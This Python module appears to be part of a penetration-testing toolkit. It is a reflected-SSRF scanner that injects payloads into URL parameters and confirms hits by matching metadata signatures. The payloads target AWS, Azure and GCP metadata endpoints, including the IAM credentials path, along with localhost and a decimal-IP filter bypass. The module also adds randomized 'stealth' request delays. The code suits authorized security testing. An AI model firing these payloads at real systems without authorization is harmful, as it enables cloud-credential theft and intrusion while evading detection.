"""SSRF scanner — deterministic, evidence-based (reflected SSRF).

Injects SSRF payloads (cloud metadata, localhost, internal) into URL parameters and
confirms a hit ONLY when the response reflects recognizable internal/metadata content
(e.g. AWS instance metadata). This catches the high-impact *reflected* SSRF class —
cloud-credential theft — without any out-of-band infrastructure.

Honest limitation: BLIND SSRF (no reflected content) needs an interaction server
(OOB). For that, use the Nuclei module (which supports Interactsh). AI-suggested,
target-tailored payloads can be added on top; the engine still verifies by evidence.

Active testing — authorized targets only.
"""
import re
import concurrent.futures
from urllib.parse import urlparse, urlunparse, parse_qsl

import requests

from modules.opsec import profile as opsec
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Parameters that commonly take a URL / host (prime SSRF sinks).
SSRF_PARAMS = ["url", "uri", "link", "src", "source", "dest", "destination", "redirect",
               "redirect_uri", "target", "proxy", "fetch", "image", "img", "site", "host",
               "to", "out", "view", "callback", "page", "feed", "open", "next", "data",
               "reference", "ref", "path", "domain", "load", "window"]

# Payloads that point at internal / metadata endpoints.
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",                                   # AWS
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",          # AWS creds
    "http://169.254.169.254/latest/dynamic/instance-identity/document",           # AWS
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",            # Azure
    "http://metadata.google.internal/computeMetadata/v1/instance/",               # GCP
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://2130706433/",       # 127.0.0.1 as a decimal integer (filter bypass)
]

# Evidence signatures — tokens that appear ONLY in a real metadata RESPONSE body,
# never in the request payloads (so a reflected payload can't false-trigger them).
# We deliberately avoid substrings of our own payloads (e.g. "iam/", "instance-id",
# "computeMetadata/v1") which reflecting parameters (LFI, error echoes) would match.
SSRF_SIGNATURES = [
    ("AWS metadata", re.compile(r'ami-launch-index|block-device-mapping|reservation-id|'
                                r'"AccessKeyId"|"SecretAccessKey"|"accountId"|"privateIp"|'
                                r'"availabilityZone"|instanceProfileArn')),
    ("Azure metadata", re.compile(r'azEnvironment|"vmId"|"osType"|"resourceGroupName"|'
                                  r'"subscriptionId"')),
]


class SSRFScanner:
    def __init__(self, timeout=8, max_workers=15):
        self.timeout = timeout
        self.max_workers = max_workers
        self.session = requests.Session()
        opsec.apply_to_session(self.session)

    def _inject(self, url, param, payload):
        p = urlparse(url)
        pairs = parse_qsl(p.query, keep_blank_values=True)
        out, replaced = [], False
        for k, v in pairs:
            if k == param:
                out.append(f"{k}={payload}")
                replaced = True
            else:
                out.append(f"{k}={v}")
        if not replaced:
            out.append(f"{param}={payload}")
        return urlunparse(p._replace(query="&".join(out)))

    @staticmethod
    def _check(body, payload=""):
        for name, rx in SSRF_SIGNATURES:
            m = rx.search(body or "")
            # Reflection guard: if the matched token is part of the payload we sent,
            # it's just our request echoed back — not real metadata content.
            if m and m.group(0).lower() not in (payload or "").lower():
                return name, m.group(0)[:80]
        return None

    def _try(self, target):
        opsec.wait()   # stealth: random delay between requests
        param, payload = target
        test_url = self._inject(self._base_url, param, payload)
        try:
            r = opsec.fetch(self.session, test_url, timeout=self.timeout,
                            allow_redirects=False)
        except requests.RequestException:
            return None
        hit = self._check(r.text, payload)
        if hit:
            name, evidence = hit
            return {"param": param, "payload": payload, "signature": name,
                    "status": r.status_code, "evidence": evidence, "url": test_url}
        return None

    def run(self, url, extra_payloads=None):
        """Fuzz URL parameters with SSRF payloads. `extra_payloads` (e.g. AI-suggested)
        are tested exactly like the built-in ones. Returns {url, params, hits}."""
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        self._base_url = url
        p = urlparse(url)
        params = [k for k, _ in parse_qsl(p.query, keep_blank_values=True)]
        used_common = False
        if not params:
            params = SSRF_PARAMS
            used_common = True

        payloads = list(SSRF_PAYLOADS)
        for xp in (extra_payloads or []):
            if xp not in payloads:
                payloads.append(xp)

        targets = [(param, pl) for param in params for pl in payloads]
        hits = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=opsec.workers(self.max_workers)) as ex:
            for res in ex.map(self._try, targets):
                if res:
                    hits.append(res)
        return {"url": url, "params": params, "used_common_params": used_common,
                "payloads_tried": len(payloads), "hits": hits}
